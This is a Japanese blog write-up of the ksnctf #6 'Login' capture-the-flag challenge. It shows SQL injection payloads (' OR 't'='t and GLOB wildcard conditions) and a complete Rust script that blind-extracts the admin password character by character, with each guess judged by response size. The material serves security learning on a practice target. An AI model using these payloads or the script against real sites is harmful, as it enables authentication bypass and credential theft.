---
layout:   post
title:    "ksnctf 006 Login"
date:     2021-05-21 21:38:04 +0900
---

## ksnctf 006 Login
- 問題公開日: 2012/05/26
- ジャンル: web

### 謎解き
　正しい `admin` `pass` を入れる問題だ。

　と言っても特別ヒントはない。が、これはおそらく `SQLインジェクション` と呼ばれる脆弱性を突く問題だろう。

　ユーザーの管理は基本的にDB管理しているものだろう。となれば、ブラウザからの入力を受けて SQL を発行していると考えられる。

　この時、入力を通して、意図しない動作をユーザーが任意に行える場合がある。

　ということで、その方針で進めてみる。

### 適当に

```yaml
admin: admin
pass: ' OR 't' = 't
```

　と入れてみると、見事に画面が切り替わる。

　そこに寄れば、「`admin` のパスワードこそがフラグだ」と記されている。

　このページから分かることは様々あるが、重要なことは。

　まず、DBは `sqlite` である

　次に、クエリの構成が以下である。

```sql
SELECT * FROM user WHERE id='$id' AND pass='$pass'
```

　先ほどの入力はつまり、

```sql
SELECT * FROM user WHERE id='admin' AND pass='' OR 't' = 't'
```

　となっていたからSQLが通ったわけである。 OR 以降が必ず true になるため。

　さて、これらを踏まえて、早速 `admin` のパスワードを特定しよう。

　id については `admin` で間違いないが、 pass をどうやって特定しようか。

### 特定する

　色々考えたが、結局ブルートフォース案しか浮かばなかったので、それにする。

　SQLにはワイルドカードを利用出来る。即ち、

```sql
SELECT * FROM user WHERE id='admin' AND pass='' OR pass LIKE '%'
```

　という指定の仕方だ。 `%` は LIKE におけるワイルドカードであり、0文字以上の文字とヒットする。従って、上記のSQLは確実に通る。

　`_` もあり、これは任意の1文字とヒットする。

　これを使って、文字数を特定できる。一文字ずつ `_` を増やして入力を試してみると、

```sql
-- pass の長さは 21文字
SELECT * FROM user WHERE id='admin' AND pass='' OR pass LIKE '_____________________'
```

　であることが分かった。上記のSQLは通る。

　また、フラグの形式は `FLAG_......` であることも踏まえると、以下まで確定する。

```sql
-- `FLAG_` を除いた pass の長さは 16文字
SELECT * FROM user WHERE id='admin' AND pass='' OR pass LIKE 'FLAG_________________'
```

　FLAGに使われる文字は `[a-z]` `[A-Z]` `[0-9]` の62文字であり、ブルートフォースを仕掛けた場合、 62文字 * 16文字 = 992文字 である。それほど多くはない。

　というわけで何とかなりそうである。

### LIKE ではなく GLOB

　実は `sqlite` の `LIKE` は大文字と小文字を区別してくれない。

　そのため、ブルートフォースを仕掛ける前にSQLを修正する必要がある。

　`LIKE` ではなく `GLOB` を使うようにするということだ。

　パターンマッチングを利用する `GLOB` を用いる。

| LIKE | GLOB | 説明
|---|---|---|
| `%` | `*` | 任意の0文字以上 |
| `_` | `?` | 任意の1文字 |

　`GLOB` では `%` の代わりに `*` を、`_` の代わりに `?` を使う。従って、

```sql
-- GLOB ver
SELECT * FROM user WHERE id='admin' AND pass='' OR pass GLOB 'FLAG_????????????????'
```

　となる。

　これで抑えるべき事項は全てだ。

　後はブルートフォースを仕掛けるだけだ。手作業だと大変なので、プログラムで行う。

　毎度お馴染みRustの時間である。

### ブルートフォース

```rust
extern crate reqwest;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let strings = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9"];

    eprintln!("*** 開始 ***");
    
    let mut prefix: String = String::from("' OR pass GLOB 'FLAG_");
    let mut suffix = "*";
    
    for number in 1..17 {
        if number == 16 { suffix = ""; }
        for s in strings.iter() {
            let pass = format!("{}{}{}", prefix.to_string(), s, suffix);
            let params = [("id", "admin"), ("pass", &pass)];
            let client = reqwest::Client::new();
            let res = client.post("https://ctfq.u1tramarine.blue/q6/index.php")
                .form(&params)
                .send()
                .await?;

            // println!("{:#?}", res);
            
            if res.content_length() > Some(2000) {
                println!("{}: {:?}{}", number, res.content_length(), pass);
                prefix.push_str(s);
                break;
            }
        }
        eprintln!("*** next ***");
    }

    eprintln!("*** 終了 ***");
    Ok(())
}
```

　`FLAG_*` `FLAG_A*` `FLAG_AA*` のように0文字以上マッチ`*`を末尾につけながら、一文字ずつ特定している。

　丁度良い指標が無かったので、 `content_length` を使った。失敗した時のコンテンツの長さは 500 程度で、成功する 2200 程度だったので、これを元に正しいかどうかを判定した。

　Rust スキルも徐々に向上していて良い。良い。

### おしまい

　無事にFLAGをゲットできた。おしまい。

## 所感

　今回は問題を見た時に謎が分かってしまったため、ささっと出来てしまった。

　しいて謎となったのは、以下2点である。

- pass をどうやって特定しようかという点
- GLOB 句を探し当てるという点

　LIKE 句で上手くいかなくてそこで `mysql` じゃないということに気付いたのだから、なめていたと言われてもしょうがない。

　とはいえ、謎が分かったとしても実際に攻撃を仕掛けられるかどうかは違うわけで、ちゃんとFLAGを取れたのは良かった。

　しかし、ブルートフォースで良かったのだろうか。SQL文をあれこれしたら案外SELECT文で取れたりしたのだろうか。まあきっとそれもおいおい分かるに違いない。似た別の問題に出会った時にこの謎は解ける。

　ではこのへんで。
　